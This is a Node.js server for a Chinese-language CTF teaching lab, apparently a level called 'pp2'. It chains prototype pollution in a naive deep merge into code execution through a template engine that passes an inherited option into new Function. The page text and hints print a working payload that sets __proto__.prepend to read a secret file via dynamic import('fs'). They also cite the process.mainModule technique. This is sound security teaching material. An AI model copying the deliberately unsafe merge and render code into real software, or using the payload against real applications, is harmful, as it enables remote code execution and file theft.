#!/usr/bin/env node
// ============================================================
// pp2 · 原型链污染 → RCE（merge 深拷贝 + 模板引擎选项注入）
// 链路：
//   ① POST /api/settings：lodash.merge 风格的"朴素深合并"不过滤 __proto__
//      → 污染 Object.prototype.prepend
//   ② GET /render：迷你模板引擎用 opts = {} 取 opts.prepend 拼进
//      new Function 的代码体（对应 ejs outputFunctionName 的经典污染点）
//      → 污染值成为可执行代码 → RCE（payload 用动态 import('fs') 读 flag）
// 说明：Node 22+ 移除了 process.mainModule，经典 payload 已失效；
//       本题演示的是"动态 import()"这一新式逃逸，服务端对渲染结果做
//       Promise 兼容处理（真实引擎中对应的利用是 await/import 与副作用写文件）。
// 运行：node server.js [port]   默认 8317；flag 在 ./flag_pp2.txt
// ============================================================
const http = require('http');
const path = require('path');
const PORT = parseInt(process.argv[2] || process.env.PORT || '8317', 10);
const FLAG_PATH = path.join(__dirname, 'flag_pp2.txt');

// 站点配置（settings 合并的目标）
const config = { site: { name: '星帆周刊', theme: 'dark', lang: 'zh' } };

// —— lodash.merge 风格的朴素深合并（漏洞①） ——
function deepMerge(dst, src) {
  for (const k in src) {
    if (src[k] !== null && typeof src[k] === 'object' && !Array.isArray(src[k])) {
      if (dst[k] === null || typeof dst[k] !== 'object') dst[k] = {};
      deepMerge(dst[k], src[k]);
    } else {
      dst[k] = src[k];
    }
  }
  return dst;
}

// —— 迷你模板引擎（漏洞②：选项对象从原型继承污染键） ——
// 形态对应 ejs：compiled += opts.outputFunctionName 的注入位置
function render(tpl, data, opts) {
  opts = opts || {};                    // 空对象 → 原型链上的 prepend 会被"继承"
  const prepend = opts.prepend || '';   // ← 污染点
  const fn = new Function('data', String(prepend) + '\nreturn `' + tpl + '`;');
  return fn(data);
}

function readBody(req) {
  return new Promise((resolve, reject) => {
    let b = '';
    req.on('data', c => { b += c; if (b.length > 1e6) req.destroy(); });
    req.on('end', () => resolve(b));
    req.on('error', reject);
  });
}

const CSS = `
:root{--bg:#0f172a;--card:#1e293b;--ink:#e2e8f0;--dim:#94a3b8;--acc:#38bdf8;--ok:#4ade80;--warn:#fbbf24;--bad:#f87171}
*{box-sizing:border-box}body{margin:0;font-family:"Segoe UI",system-ui,-apple-system,sans-serif;background:var(--bg);color:var(--ink);line-height:1.75}
.wrap{max-width:920px;margin:0 auto;padding:24px 16px 60px}
.badge{display:inline-block;background:#c084fc;color:#2e1065;font-weight:700;font-size:12px;padding:2px 10px;border-radius:999px;letter-spacing:1px}
h1{font-size:26px;margin:10px 0 4px}.meta{color:var(--dim);font-size:13px;margin-bottom:6px}
.card{background:var(--card);border:1px solid #334155;border-radius:12px;padding:18px 20px;margin:16px 0}
.card h2{margin:0 0 10px;font-size:17px;color:var(--acc);border-left:3px solid var(--acc);padding-left:8px}
pre,code{font-family:Consolas,Menlo,"Courier New",monospace}
pre{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:12px;overflow:auto;font-size:13px}
code{background:#0b1220;border-radius:4px;padding:1px 6px;font-size:13px}
textarea{width:100%;min-height:110px;padding:10px;border-radius:8px;border:1px solid #475569;background:#0b1220;color:var(--ink);font-family:Consolas,monospace;font-size:13px}
button{padding:8px 18px;border-radius:8px;border:0;background:var(--acc);color:#04121f;font-weight:700;cursor:pointer;margin:2px 4px 2px 0}
button:hover{filter:brightness(1.15)}
details{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:10px 14px;margin:8px 0}
summary{cursor:pointer;color:var(--warn);font-weight:600}
.nav{display:flex;justify-content:space-between;margin-top:22px}.nav a{color:var(--acc);text-decoration:none}
footer{color:var(--dim);font-size:12px;text-align:center;margin-top:30px}
.flagrow{display:flex;gap:8px;flex-wrap:wrap}#flagResult{margin-top:8px;font-size:14px;color:var(--warn);word-break:break-all}
#out{background:#0b1220;border:1px solid #27364d;border-radius:8px;padding:12px 14px;margin-top:10px;font-size:14px;white-space:pre-wrap;word-break:break-all;min-height:24px}
.pathbox{background:#052e16;border:1px solid #14532d;color:#bbf7d0;border-radius:8px;padding:10px 14px;margin-top:12px;font-size:14px}
a{color:var(--acc)}
`;

const PAGE = `<!DOCTYPE html><html lang="zh-CN"><head><meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>pp2 · 污染到 RCE | CTF 教学靶场</title><style>${CSS}</style></head><body><div class="wrap">
<header><span class="badge">原型链污染 · 第 2 关</span>
<h1>星帆周刊 · 站点配置与模板预览</h1>
<div class="meta">难度：★★★★★ 高阶 | 关卡 ID：<code>pp2</code> · 运行时：Node（零依赖）</div></header>

<section class="card"><h2>题目描述</h2>
<p>上一关（pp1）你污染了 <code>Object.prototype</code> 翻转了一个布尔开关。这一关把它变成<b>任意代码执行</b>。</p>
<p>星帆周刊有两个功能：</p>
<ul>
<li><b>站点配置</b> <code>POST /api/settings</code>：JSON 深合并进 config（lodash.merge 风格——同样的老毛病）；</li>
<li><b>模板预览</b> <code>GET /render?tpl=你好,{name}</code>：迷你模板引擎。它渲染时会读一个<b>默认选项对象的 prepend 字段</b>，
    把它拼进动态生成的函数体（这个设计"致敬"了 ejs 的 <code>outputFunctionName</code>——CVE-2019-17443 等一票 RCE 的源头）。</li>
</ul>
<div class="pathbox">🗂️ 服务器上藏着机密文件：<code>${FLAG_PATH.replace(/</g, '&lt;')}</code>（读到它就是 flag）</div></section>

<section class="card"><h2>实验区</h2>
<p>模板（占位符 {name}；禁止反引号与 \${，防止直接模板注入——本题要你走污染这条路）：</p>
<input id="tpl" style="width:70%;padding:8px 10px;border-radius:8px;border:1px solid #475569;background:#0b1220;color:#e2e8f0" value="周刊预览：{name}">
<button onclick="doRender()">渲染预览 GET /render</button>
<p style="margin-top:14px">配置 JSON（POST /api/settings）：</p>
<textarea id="j">{
  "site": { "theme": "light" }
}</textarea><br>
<button onclick="save()">保存配置</button>
<button onclick="state()">查看状态（config + 污染检测）</button>
<button onclick="reset()">清理污染</button>
<div id="out">（结果区）</div></section>

<section class="card"><h2>知识点讲解</h2>
<p>模板引擎的代码生成（漏洞②，默认参数从原型继承）：</p>
<pre>function render(tpl, data, opts) {
  opts = opts || {};                    // 空 options 对象
  const prepend = opts.prepend || '';   // ← 污染后：Object.prototype.prepend 参与拼码
  const fn = new Function('data', prepend + 'return \`'+tpl+'\`;');
  return fn(data);
}</pre>
<p>完整链路（merge 漏洞 × 代码生成漏洞）：</p>
<pre>POST /api/settings  {"__proto__":{"prepend":"return import('fs').then(m=>m.readFileSync('<机密文件路径>','utf8'));"}}
GET  /render?tpl=x  →  new Function 里第一行就是注入的 return → import('fs') 读文件 → Promise 结果返回</pre>
<p>真实世界对应物：</p>
<ul>
<li><b>ejs + lodash.merge</b>（或 qs/querystring 解析 + 任何 deep-merge）：污染 <code>outputFunctionName</code>/<code>escapeFunction</code> 等
    "会进编译代码"的选项 → RCE（2019 年起大量 Node CTF 的模板题）。</li>
<li>污染 <code>child_process</code> 的 options / <code>NODE_OPTIONS</code> / <code>shell</code> 字段达成命令执行。</li>
<li>历史注脚：经典 payload <code>process.mainModule.require('child_process')</code> 在 Node 22+ 已随 mainModule 移除而失效，
    取而代之的是<b>动态 import()</b>——本题演示的就是它（引擎侧对渲染结果做 Promise 兼容后，异步读文件的结果可以直达响应）。</li>
</ul></section>

<section class="card"><h2>渐进提示</h2>
<details><summary>提示 1：先确认两个功能都正常</summary><p>保存 <code>{"site":{"theme":"light"}}</code> 后看状态；渲染 <code>周刊预览：{name}</code> 应输出"周刊预览：星尘读者"。</p></details>
<details><summary>提示 2：找到"会进代码"的字段</summary><p>render 的 opts 是个空对象——它和 pp1 的 gate 一样会"继承"原型上的键。知识区代码里的 <code>prepend</code> 会被原样拼进 new Function 的函数体。</p></details>
<details><summary>提示 3：payload</summary><p>POST <code>{"__proto__":{"prepend":"return import('fs').then(m=>m.readFileSync('${'<机密文件路径>'}','utf8'));"}}

</code>（路径见页面顶部绿框），然后 GET <code>/render?tpl=x</code>，响应即文件内容。</p></details>
</section>

<section class="card"><h2>提交 Flag</h2>
<form id="flagForm" class="flagrow" onsubmit="return false">
<input type="text" id="flagInput" placeholder="flag{...}" style="flex:1">
<button onclick="submitFlag()">提交</button></form><div id="flagResult"></div></section>

<nav class="nav"><a href="../pp1">← 上一关：pp1</a><a href="../graphql1">下一关：graphql1 · 内省泄露 →</a></nav>
<footer>CTF Web 教学式靶场 · F 组 · 仅用于安全学习</footer></div>
<script>
var out=document.getElementById('out');
function show(t){out.textContent=t}
function doRender(){
  fetch('/render?tpl='+encodeURIComponent(document.getElementById('tpl').value))
    .then(r=>r.text()).then(show).catch(e=>show('ERR '+e));
}
function save(){
  var body;
  try{ body=JSON.stringify(JSON.parse(document.getElementById('j').value)); }
  catch(e){ show('JSON 解析失败：'+e.message); return; }
  fetch('/api/settings',{method:'POST',headers:{'Content-Type':'application/json'},body:body})
    .then(r=>r.text()).then(show).catch(e=>show('ERR '+e));
}
function state(){ fetch('/api/state').then(r=>r.text()).then(show).catch(e=>show('ERR '+e)); }
function reset(){ fetch('/api/reset').then(r=>r.text()).then(show).catch(e=>show('ERR '+e)); }
function submitFlag(){
  var v=document.getElementById('flagInput').value.trim();
  var el=document.getElementById('flagResult');
  if(!v){el.textContent='请输入 flag';return}
  el.textContent='提交中...';
  fetch('/api/verify',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:'challenge_id=pp2&flag='+encodeURIComponent(v)})
   .then(function(r){return r.text().then(function(t){
      var msg='HTTP '+r.status+': '+t;
      try{var j=JSON.parse(t);
        if(typeof j.correct==='boolean')msg=j.correct?'✅ 回答正确！':'❌ flag 不对，再试试';
        else if(j.message!==undefined)msg=j.message;
      }catch(e){}
      el.textContent=msg;})})
   .catch(function(e){el.textContent='提交失败('+e.message+')：请从靶场门户页提交'});
}
</script></body></html>`;

const server = http.createServer(async (req, res) => {
  const u = new URL(req.url, `http://127.0.0.1:${PORT}`);
  const p = u.pathname.replace(/^\/pp2/, '') || '/';

  if (p === '/' && req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'text/html; charset=utf-8' });
    return res.end(PAGE);
  }
  if (p === '/api/settings' && req.method === 'POST') {
    try {
      const body = JSON.parse((await readBody(req)) || '{}');
      deepMerge(config, body);
      res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
      return res.end(JSON.stringify({ ok: true, config }));
    } catch (e) {
      res.writeHead(400, { 'Content-Type': 'application/json; charset=utf-8' });
      return res.end(JSON.stringify({ error: 'invalid json: ' + e.message }));
    }
  }
  if (p === '/api/state' && req.method === 'GET') {
    res.writeHead(200, { 'Content-Type': 'application/json; charset=utf-8' });
    return res.end(JSON.stringify({
      config,
      prototype_polluted: Object.prototype.hasOwnProperty('prepend') || 'prepend' in Object.prototype,
    }));
  }
  if (p === '/render' && req.method === 'GET') {
    let tpl = u.searchParams.get('tpl') || '';
    // 限制模板本身不能带代码语法：本题要求走"污染选项"这条路（对应防御讲解）
    if (/[\`]|\\\$\{/.test(tpl)) {
      res.writeHead(400, { 'Content-Type': 'text/plain; charset=utf-8' });
      return res.end('模板包含被禁止的语法（反引号 / 模板插值）——请走配置那条路。');
    }
    tpl = tpl.replace(/\{(\w+)\}/g, '${data.$1}');   // {name} → ${data.name}
    try {
      const result = render(tpl, { name: '星尘读者' }, undefined);   // opts 不传 → {} → 继承污染
      // 渲染结果可能是 Promise（import() payload）——真实引擎没有这一步，
      // 攻击者会用"副作用写文件/回连"代替返回值；这里为了教学把异步结果直接回显
      Promise.resolve(result).then(v => {
        res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
        res.end(String(v));
      }).catch(e => {
        res.writeHead(500, { 'Content-Type': 'text/plain; charset=utf-8' });
        res.end('渲染错误: ' + e.message);
      });
    } catch (e) {
      res.writeHead(500, { 'Content-Type': 'text/plain; charset=utf-8' });
      res.end('渲染错误: ' + e.message);
    }
    return;
  }
  if (p === '/api/reset') {
    delete Object.prototype.prepend;
    res.writeHead(200, { 'Content-Type': 'text/plain; charset=utf-8' });
    return res.end('已清理 Object.prototype.prepend。');
  }
  res.writeHead(404, { 'Content-Type': 'text/plain; charset=utf-8' });
  res.end('not found');
});

server.listen(PORT, '0.0.0.0', () => {
  console.log(`[pp2] listening on http://0.0.0.0:${PORT}/  (deploy behind /pp2/)`);
  console.log(`[pp2] flag file: ${FLAG_PATH}`);
});
